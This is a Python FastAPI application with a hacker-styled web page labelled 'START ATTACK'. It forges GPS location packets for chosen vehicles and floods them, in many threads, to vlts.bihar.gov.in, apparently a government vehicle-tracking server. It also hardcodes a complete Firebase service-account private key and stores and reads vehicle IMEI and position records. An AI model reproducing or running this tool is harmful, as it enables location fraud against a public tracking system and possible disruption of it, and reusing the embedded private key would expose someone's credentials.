import socket, threading, time, os, json
from datetime import datetime, timedelta, timezone
from fastapi import FastAPI
from fastapi.responses import HTMLResponse
import firebase_admin
from firebase_admin import credentials, db

app = FastAPI()

# --- 🛠️ INTERNAL MASTER KEY (FIXED INITIALIZATION) ---
db_connected = False
try:
    master_key = {
      "type": "service_account",
      "project_id": "ghop-ghop-gps-injection",
      "private_key_id": "d5b408339ce182d137a67309d529f057c3e644aa",
      "private_key": "-----BEGIN PRIVATE KEY-----\nMIIEvwIBADANBgkqhkiG9w0BAQEFAASCBKkwggSlAgEAAoIBAQCuN+K0bxHcn9Ww\nCDNc/7VQhYhmnU4htnEANKk/I2QzQjp2PPw/LaTc6qd+Ov0An6JYnpS9nx4CpPty\n4ZSu+mJBIzWpQh02NSFmLNtW2DGqreJcRTZVD6FSuybXiGtj+zutOcESz1Dn83Ct\nD+f4PVJb/zl8ZpEa8BJIyMVGkgkvXP9Zvk2I6vKofDRFU9TXt4eaodrDM0kuny0V\nIj4XEX5ZxYAc2TaGDAmFa2GJ+wEwRe1WTMQxanplT25xYE2G298YmYpM5ZDk0Wna\nHazKuxItU/gcWkmWI/Bf2+qFzG7fa6ODGgAhOESlvUDjR4i/QKkZzzCGb11/M4XF\nmgGcD9ePAgMBAAECggEAIILhVZacmLVjJTSCkUpOxbYFnFCisfvf3o/1PYkXO9GS\nI1qCIDAeYfOQSigr6p/fpfYB/9jfutKa8fdSzcx/5XPyoaFq3iDQGMcqL2ys6BMG\n+P0ZhIokKtIuD26vy7qoik0K0L3LdV2im0kqmtKmufBJBAQH9CT05IxC9EZwXFwJ\njr+IqeNVCgybWoVxdnH1kMxRn04Id7k3Cco4tzU58MRzE+MbIpROOIvIUY+ojCTu\ngKAUhL/Z2yCN8FJknLU5+pgBrfztkn0oPQoIu34+cwQmTnaPB8f8mjuikKyUnKvk\ PWVOLm9+0Cs9zmvamWnC0/x5UWifZSzr/SHyD4d3YQKBgQDcSIHq0CRyscwbXm6n\ns/UKw3WPbBLsZfH7r8SkpwO8a+gWOjr9P24cwXDrbo5jPoPaksBJjG/k6aKpvmFx\nkKlNFgsw5RepV1CDJqrCRW7jlU3iOIPvvcP31iB9ZstZxVzghrqivxZex2kh079J\nA8JiiCrQut8i21VosRaYYEC0mQKBgQDKd1HqiqQcIVrfxoR4X0LNKYW/20HbziAi\n48+rPfGEWNHneJJwQA5QTQq6fDcHR2xdFQvZHV9sGcmh5ENJqjefHgTx6sjujmjF\nqnv2q9WKNVZPxoOjRJ1V+XaAPyHLGfag9xC17oKUB+YPiT0fgyLsOypFTCvygx+F\n6Djo2M9eZwKBgQCoQHWC7bI5LJZyfSFV1H0g2IRNpMWbbI50qB8xiCOxYlYlzBpM\nXotzSUk/efUl1pUNeLOIOc0pck59Cl4RSOYXa/PmR8VX4cosMneQ5Um6aMrRNEuJ\n7U7mWNX+EmrVyYqUMDQTpJKol/U0EjDzyvxJGCpjvag7Tn4g9coFXtdtWQKBgQCP\nezfGKzJZ7RlldF30oC3LDx4F9PAbQVxs3V0SUfeSfw9iJoRAoGSEa9Sqi9TDh843\nuO6IktRI242U+RrmXYbFcJS4jFaRGMMPMd5f1S6jn2DncBth3QJTJ1LfV94u/NtW\n/0AMblaDaYWUhQGYD2r0VomCSpTqbBou339VJDDxCQKBgQDT060xYe2kYD9t1s1K\nt8SJxjGeWqYgwZqRptwpsfxCeiOEfolxsy0RKtEXAv0eU8MBBdpQBUnc4T3yswMF\ne3pZLNFz8ALtyk1s6d0iwdFAJJyVmO/STyHzWOD6VDCCtsQsRLxK49yvBRgijTHd\nThJEB/Rwv+sYG/vzLyOmk4D/Vg==\n-----END PRIVATE KEY-----\n",
      "client_email": "firebase-adminsdk-fbsvc@ghop-ghop-gps-injection.iam.gserviceaccount.com"
    }
    
    # Check if app already initialized
    if not firebase_admin._apps:
        cred = credentials.Certificate(master_key)
        firebase_admin.initialize_app(cred, {
            'databaseURL': 'https://ghop-ghop-gps-injection-default-rtdb.firebaseio.com'
        })
    db_connected = True
    print("✓ FIREBASE_LINK_OK")
except Exception as e:
    print(f"✗ AUTH_FAIL: {e}")

# --- GLOBAL VARS ---
firing = False
total_sent = 0
logs = []
TAGS = ["RA18", "WTEX", "MARK", "ASPL", "LOCT14A", "ACT1", "AIS140", "VLTD", "AMAZON", "BBOX77", "EGAS", "MENT", "MIJO", "ROADRPA", "GRL"]

# --- API ENDPOINTS ---
@app.get("/fetch_data")
def fetch_data(vno: str):
    v_up = vno.upper().strip()
    if not db_connected: return {"found": False, "err": "AUTH_FAILED"}
    try:
        # Check direct in Data_Records
        ref = db.reference('Data_Records').child(v_up)
        data = ref.get()
        if data:
            return {"found": True, "imei": data.get('IMEI_No',''), "lat": data.get('Lat',''), "lon": data.get('Lon','')}
        return {"found": False, "err": "NOT_FOUND"}
    except Exception as e:
        return {"found": False, "err": "DB_BUSY"}

@app.get("/init")
def init(v:str, i:str, lt:str, ln:str):
    global firing, total_sent, logs
    if not firing:
        v_up = v.upper().strip()
        firing, total_sent = True, 0
        logs = ["<span style='color:#fff'>[SYS] HANDSHAKE STARTING...</span>"]
        try:
            db.reference('Data_Records').child(v_up).update({'IMEI_No':i,'Lat':lt,'Lon':ln,'Status':'Active'})
            logs.append("<span style='color:#0f0'>[DB] SYNC_STABLISHED</span>")
        except: logs.append("<span style='color:#f00'>[ERR] WRITE_DENIED</span>")
        
        for tag in TAGS:
            threading.Thread(target=handshake_worker, args=(tag,i,v_up,lt,ln), daemon=True).start()
    return {"ok": True}

def handshake_worker(tag, imei, vno, lat, lon):
    global firing, total_sent, logs
    while firing:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect(("vlts.bihar.gov.in", 9999))
            now = datetime.now(timezone.utc) + timedelta(hours=5, minutes=30)
            dt, tm = now.strftime('%d%m%Y'), now.strftime('%H%M%S')
            pkt = f"$PVT,{tag},2.1.1,NR,01,L,{imei},{vno},1,{dt},{tm},{lat},N,{lon},E,0.00,0.0,11,73,0.8,0.8,airtel,1,1,11.5,4.3,0,C,26,404,73,0a83,e3c8,e3c7,0a83,7,e3fb,0a83,7,c79d,0a83,10,e3f9,0a83,0,0001,00,000041,DDE3*\\r\\n"
            s.sendall(bytes(pkt, 'ascii'))
            total_sent += 1
            s.close()
            logs.append(f"<span style='color:#0f0'>[{tm}] {tag} OK</span>")
            if len(logs) > 10: logs.pop(0)
            time.sleep(0.1)
        except: time.sleep(1)

@app.get("/status")
def status(): return {"c": total_sent, "l": logs}

@app.get("/stop")
def stop(): global firing; firing = False; return {"ok": True}

# --- UI (FULL FIX) ---
@app.get("/", response_class=HTMLResponse)
async def home():
    return """
    <html><head><title>NITRO V82 PRO</title><style>
    body { background:#000; color:#0f0; font-family:monospace; display:flex; justify-content:center; align-items:center; height:100vh; margin:0; }
    .box { width:400px; border:2px solid #0f0; padding:20px; background:rgba(0,10,0,0.9); border-radius:10px; text-align:center; box-shadow: 0 0 15px #0f0; }
    input { width:100%; background:#000; border:1px solid #0f0; color:#0f0; padding:12px; margin-top:10px; outline:none; text-transform:uppercase; font-family:monospace; }
    button { width:100%; padding:12px; margin-top:10px; cursor:pointer; background:transparent; color:#0f0; border:1px solid #0f0; font-weight:bold; }
    #log { height:150px; background:#000; border:1px dotted #0f0; margin-top:10px; padding:8px; font-size:11px; overflow-y:auto; text-align:left; }
    </style></head><body>
    <div class="box">
        <h2 style="letter-spacing:2px;">NITRO V82 PRO</h2>
        <input type="text" id="v" onblur="fetchData()" placeholder="VEHICLE NUMBER">
        <input type="text" id="i" placeholder="IMEI NUMBER">
        <div style="display:flex;gap:5px;"><input type="text" id="lt" placeholder="LAT"><input type="text" id="ln" placeholder="LON"></div>
        <button onclick="st()" style="background:#0f0; color:#000;">START ATTACK</button>
        <button onclick="sp()" style="color:red;border-color:red;">STOP</button>
        <button onclick="location.reload()" style="color:yellow;border-color:yellow;font-size:10px;">SYSTEM RESET</button>
        <div id="log">READY...</div>
        <div style="margin-top:10px; display:flex; justify-content:space-between; font-weight:bold;"><span>SENT: <b id="c">0</b></span><span id="st" style="color:lime">IDLE</span></div>
    </div>
    <script>
        let m;
        function fetchData() {
            let v = document.getElementById('v').value.toUpperCase().trim();
            if(v.length > 4) {
                document.getElementById('log').innerHTML += `<br>[SYS] SEARCHING ${v}...`;
                fetch(`/fetch_data?vno=${v}`).then(r=>r.json()).then(d=>{
                    if(d.found) {
                        document.getElementById('i').value=d.imei; document.getElementById('lt').value=d.lat; document.getElementById('ln').value=d.lon;
                        document.getElementById('log').innerHTML += "<br><span style='color:lime'>[SUCCESS] RECORD LOADED</span>";
                    } else { document.getElementById('log').innerHTML += `<br><span style='color:red'>[ERR] ${d.err}</span>`; }
                    var objDiv = document.getElementById("log"); objDiv.scrollTop = objDiv.scrollHeight;
                });
            }
        }
        function st() {
            fetch(`/init?v=${document.getElementById('v').value}&i=${document.getElementById('i').value}&lt=${document.getElementById('lt').value}&ln=${document.getElementById('ln').value}`);
            document.getElementById('st').innerText="RUNNING"; document.getElementById('st').style.color="red";
            if(!m) m = setInterval(() => { fetch('/status').then(r=>r.json()).then(d=>{ document.getElementById('c').innerText=d.c; document.getElementById('log').innerHTML=d.l.join("<br>"); var objDiv=document.getElementById("log"); objDiv.scrollTop=objDiv.scrollHeight; }); }, 1000);
        }
        function sp() { fetch('/stop'); clearInterval(m); m=null; document.getElementById('st').innerText="IDLE"; document.getElementById('st').style.color="lime"; }
    </script></body></html>
    """
